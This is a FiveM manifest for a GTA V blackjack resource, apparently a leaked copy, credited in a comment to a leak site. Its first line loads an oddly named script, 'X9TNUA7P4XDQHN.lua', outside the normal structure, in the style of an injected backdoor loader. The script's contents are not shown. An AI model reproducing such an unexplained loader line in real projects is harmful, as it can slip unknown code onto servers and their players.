client_script "X9TNUA7P4XDQHN.lua"
fx_version 'adamant'

game "gta5"

description "DiamondBlackjack created by Robbster"

-- Leaking Hub | J. Snow | https://leakinghub.com

client_scripts {
	"src/RMenu.lua",
	"src/menu/RageUI.lua",
	"src/menu/Menu.lua",
	"src/menu/MenuController.lua",
	"src/components/*.lua",
	"src/menu/elements/*.lua",
	"src/menu/items/*.lua",
	"src/menu/panels/*.lua",
	"src/menu/panels/*.lua",
	"src/menu/windows/*.lua",
	"cl_blackjack.lua",
}

server_scripts {
	"sv_blackjack.lua",
}

files{
	"peds.meta",

}

data_file "PED_METADATA_FILE" "peds.meta"

